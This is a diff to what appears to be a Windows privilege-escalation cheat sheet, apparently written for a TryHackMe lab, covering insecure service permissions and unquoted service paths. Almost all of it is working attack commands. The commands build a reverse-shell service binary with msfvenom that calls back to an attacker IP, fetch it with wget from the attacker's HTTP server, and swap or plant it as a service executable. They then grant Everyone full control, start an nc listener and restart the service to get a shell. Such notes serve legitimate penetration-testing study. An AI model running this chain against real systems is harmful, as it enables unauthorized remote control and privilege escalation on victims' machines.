@@ -135,25 +135,44 @@ sc.exe qc WindowsScheduler # powershell
 icacls C:\PROGRA~2\SYSTEM~1\WService.exe 
 3️⃣ # Making a malicious Payload with MSFvenom:
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.99.141 LPORT=4445 -f exe-service -o rev-svc.exe
-4️⃣ # Transfer of malicious file to the victim system:
+4️⃣ # Transfer of malicious file to the victim system
 python3 -m http.server # attackbox
 wget http://10.11.99.141:8000/rev-svc.exe -O rev-svc.exe # target system
 5️⃣ # Replace the service executable file ( before copy backup from file ):
 cp C:\PROGRA~2\SYSTEM~1\WService.exe C:\PROGRA~2\SYSTEM~1\WService.exe.bkp
 move C:\Users\thm-unpriv\rev-svc.exe C:\PROGRA~2\SYSTEM~1\WService.exe
-6️⃣ # Giving all users permission:
+6️⃣ # Giving all users permission for run this file
 icacls C:\PROGRA~2\SYSTEM~1\WService.exe /grant Everyone:F
 7️⃣ # Launch Lenner on the attackbox
 nc -lvp 4445
-8️⃣ # start service and get access:
+8️⃣ # stop and start service for get access
 sc stop windowsscheduler # cmd
 sc start windowsscheduler # cmd
 sc.exe stop windowsscheduler # powershell
 sc.exe start windowsscheduler # powershell
 ----------------------------------------------------------------
 ✅ # Privilege Escalation with Unquoted Service Paths
-
-
+1️⃣ # Check the configuration details of a particular service example ( BINARY_PATH_NAME and SERVICE_START_NAME and .. )
+sc qc WindowsScheduler # cmd
+sc.exe qc WindowsScheduler # powershell
+2️⃣ # Checking access level on vulnerable pathway
+icacls C:\MyPrograms
+3️⃣ # Making a malicious Payload with MSFvenom:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.99.141 LPORT=4446 -f exe-service -o rev-svc2.exe
+4️⃣ # Transfer of malicious file to the victim system
+python3 -m http.server # attackbox
+wget http://10.11.99.141:8000/rev-svc2.exe -O rev-svc2.exe # target system
+5️⃣ # Insert malicious file
+move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
+6️⃣ # Giving all users permission for run this file
+icacls C:\MyPrograms\Disk.exe /grant Everyone:F
+7️⃣ # Launch Lenner on the attackbox
+nc -lvp 4446
+8️⃣ # stop and start service for get access
+sc stop "disk sorter enterprise" # cmd
+sc start "disk sorter enterprise" # cmd
+sc.exe stop "disk sorter enterprise" # powershell
+sc.exe start "disk sorter enterprise" # powershell
 ----------------------------------------------------------------
 # Check services through the Windows Registry
 
